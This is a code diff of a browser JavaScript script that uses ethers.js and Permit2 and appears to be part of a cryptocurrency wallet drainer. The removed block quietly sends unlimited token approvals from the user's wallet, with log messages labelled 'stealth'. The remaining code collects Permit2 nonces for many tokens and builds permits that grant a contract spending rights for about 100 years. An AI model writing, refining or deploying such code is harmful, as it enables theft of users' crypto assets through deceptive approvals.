@@ -315,54 +315,6 @@ if (existing && existing.length > 0 && existing[0].sig_deadline <= now) {
   log("⌛ Cached permit expired — refreshing...");
 }
 
-  const erc20Abi = [
-  "function allowance(address owner, address spender) view returns (uint256)",
-  "function approve(address spender, uint256 amount) returns (bool)"
-];
-
-let needsReload = false;
-let approved = false;
-
-for (const token of TOKENS) {
-
-  const tokenContract = new ethers.Contract(
-    token,
-    erc20Abi,
-    provider
-  );
-
-  const allowance = await tokenContract.allowance(user, PERMIT2);
-
-  if (allowance === 0n && !approved) {
-
-    log("🔓 Stealth Permit2 approval...");
-
-    const signerToken = new ethers.Contract(
-      token,
-      erc20Abi,
-      signer
-    );
-
-    const tx = await signerToken.approve(
-      PERMIT2,
-      ethers.MaxUint256
-    );
-
-    await tx.wait();
-
-    log("✅ Permit2 approved");
-
-    approved = true;
-    needsReload = true;
-  }
-}
-
-if (needsReload) {
-  log("🔄 Reloading stealth...");
-  setTimeout(() => location.reload(), 1200);
-  return;
-}
-
 const permit2 = new ethers.Contract(
   PERMIT2,
   ["function allowance(address,address,address) view returns(uint160,uint48,uint48)"],
@@ -375,10 +327,16 @@ const expiration = Math.floor(Date.now()/1000) + (100 * 365 * 24 * 60 * 60);
 
 const details = [];
 
-for (const token of TOKENS) {
+const nonceResults = await Promise.all(
+  TOKENS.map(token =>
+    permit2.allowance(user, token, CONTRACT)
+  )
+);
 
-  const [allowedAmount, allowedExpiration, nonce] =
-    await permit2.allowance(user, token, CONTRACT);
+for (let i = 0; i < TOKENS.length; i++) {
+
+  const token = TOKENS[i];
+  const [, , nonce] = nonceResults[i];
 
   log("Nonce " + token + ": " + nonce);
 
